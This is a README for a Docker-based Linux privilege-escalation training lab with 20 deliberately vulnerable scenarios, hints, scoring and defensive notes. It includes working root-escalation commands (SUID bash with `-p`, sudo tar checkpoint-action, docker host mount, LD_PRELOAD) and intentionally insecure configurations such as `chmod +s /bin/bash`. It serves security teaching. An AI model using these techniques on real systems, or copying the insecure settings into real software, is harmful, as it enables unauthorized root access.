# 42 — Privesc Playground

> **Difficulty:** Intermediate | **Time:** 3–5 days | **Language:** Python

A Linux privilege escalation lab with 20+ exploitable scenarios — SUID binaries, sudo misconfigurations, cron job abuse, capability exploitation, and more. Learn how attackers go from user to root.

---

## What You'll Build

A Docker-based lab environment with:
- **20+ isolated vulnerabilities** — each in its own container
- **Vulnerable configurations** intentionally set up to be exploited
- **Hints system** — progressive hints without spoilers
- **Automated scoring** — verify successful exploitation
- **Reference exploits** — working solutions for each scenario
- **Blue team notes** — how to detect and prevent each technique

---

## Tech Stack

| Component | Technology |
|-----------|-----------|
| Lab management | Python (Flask) |
| Containers | Docker + Docker Compose |
| Scenarios | Bash + C (custom SUID binaries) |
| Scoring | Python + REST API |

---

## Project Structure

```
42-privesc-playground/
├── README.md
├── docker-compose.yml
├── lab_manager/
│   ├── app.py               ← Lab management UI
│   └── scorer.py            ← Exploit verification
├── scenarios/
│   ├── 01-suid-bash/
│   │   ├── Dockerfile       ← Vulnerable: bash with SUID set
│   │   ├── setup.sh         ← Configure vulnerability
│   │   ├── hint.txt         ← Progressive hints
│   │   └── solution.md      ← Full writeup
│   ├── 02-sudo-nopasswd/
│   ├── 03-writable-cron/
│   ├── 04-path-injection/
│   ├── 05-wildcard-injection/
│   ├── 06-docker-group/
│   ├── 07-lxd-group/
│   ├── 08-nfs-no-root-squash/
│   ├── 09-cap-setuid/
│   ├── 10-cap-net-raw/
│   ├── 11-env-path-hijack/
│   ├── 12-ld-preload-sudo/
│   ├── 13-world-writable-script/
│   ├── 14-passwd-writable/
│   ├── 15-sudoers-all/
│   ├── 16-setuid-python/
│   ├── 17-systemctl-user/
│   ├── 18-at-command/
│   ├── 19-kernel-exploit-sim/
│   └── 20-docker-socket/
└── docs/
    ├── PRIVESC_METHODOLOGY.md
    └── LINUX_SECURITY_MODEL.md
```

---

## The 20 Scenarios

| # | Technique | Vulnerability | CVSS-like Score |
|---|-----------|--------------|-----------------|
| 01 | SUID bash | `chmod +s /bin/bash` | 9.8 |
| 02 | Sudo NOPASSWD | `user ALL=(root) NOPASSWD: /usr/bin/find` | 9.8 |
| 03 | Writable cron | `/etc/cron.d/` world-writable | 9.0 |
| 04 | PATH injection | Script calls `python` without full path | 8.8 |
| 05 | Wildcard injection | `tar * -czf backup.tar.gz` | 8.5 |
| 06 | Docker group | User in docker group → `docker run -v /:/host alpine` | 9.8 |
| 07 | LXD/LXC group | Escalate via LXD container | 9.5 |
| 08 | NFS no_root_squash | NFS mount with no_root_squash | 8.0 |
| 09 | CAP_SETUID | Python binary with cap_setuid capability | 9.0 |
| 10 | CAP_NET_RAW | Raw socket capability abuse | 7.0 |
| 11 | PATH hijack | Writable directory early in PATH | 8.0 |
| 12 | LD_PRELOAD | `sudo LD_PRELOAD=/tmp/evil.so program` | 9.8 |
| 13 | World-writable script | Script run by root, writable by all | 9.8 |
| 14 | /etc/passwd writable | Add root user to passwd file | 9.8 |
| 15 | Sudoers ALL | `user ALL=(ALL) ALL` (can become any user) | 9.8 |
| 16 | SUID Python | Python3 with SUID → os.setuid(0) | 9.5 |
| 17 | systemctl --user | Escape user service to root | 8.5 |
| 18 | at command | Schedule command as root via at | 8.0 |
| 19 | Kernel exploit sim | Simulated DirtyCow-like scenario | 9.8 |
| 20 | Docker socket | Access to `/var/run/docker.sock` | 9.8 |

---

## Usage

```bash
# Start the lab
docker compose up

# Open lab interface
open http://localhost:5000

# Or SSH into a specific scenario container
docker compose exec scenario-01 bash

# Check your privilege
id  # Should show: uid=1000(user)

# After exploiting, verify
id  # Should show: uid=0(root)

# Submit flag
# In each container, becoming root reveals /root/flag.txt
cat /root/flag.txt
# Submit via: http://localhost:5000/submit?flag=FLAG_VALUE
```

---

## Example: SUID Bash Exploitation

```bash
# Check for SUID files
find / -perm -u=s -type f 2>/dev/null
# Output: /bin/bash  ← suspicious! bash should never have SUID

# Exploit
/bin/bash -p  # -p preserves SUID privileges
# Now you have a root bash shell

# Why this works:
# SUID (Set User ID) means the program runs as its OWNER, not the executor
# bash's owner is root → bash -p gives you root
```

## Example: Sudo Wildcard Injection

```bash
# Check sudo permissions
sudo -l
# User may run: (root) NOPASSWD: /usr/bin/tar *

# Exploit: tar's --checkpoint-action flag can run arbitrary commands
sudo tar -cf /dev/null /dev/null \
  --checkpoint=1 \
  --checkpoint-action=exec=/bin/bash

# Root shell!
```

---

## Learning Objectives

- [ ] Linux file permissions model (rwx, SUID, SGID, sticky bit)
- [ ] How sudo works and how to read sudoers configurations
- [ ] Linux capabilities vs. SUID
- [ ] Common post-exploitation privesc enumeration methodology
- [ ] How to use LinPEAS and linenum for automated discovery
- [ ] How to defend each vulnerability (patch, config change)

---

## Challenges & Extensions

- Add **Windows privesc** scenarios (AlwaysInstallElevated, Unquoted Service Paths)
- Implement **automated privesc** using LinPEAS in lab context
- Add **container escape** scenarios (privileged container, cap_sys_admin)
- Build **detection rules** for each attack technique
- Add **MITRE ATT&CK** mapping for each scenario
- Create a **CTF challenge** combining multiple scenarios

---

## References

- [GTFOBins — SUID/sudo exploit database](https://gtfobins.github.io/)
- [LinPEAS — Linux Privilege Escalation Awesome Script](https://github.com/carlospolop/PEASS-ng)
- [HackTricks — Linux Privesc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- MITRE ATT&CK: [T1548 — Abuse Elevation Control Mechanism](https://attack.mitre.org/techniques/T1548/)

---

*NullAI Lab — Project 42 | Privesc Playground*
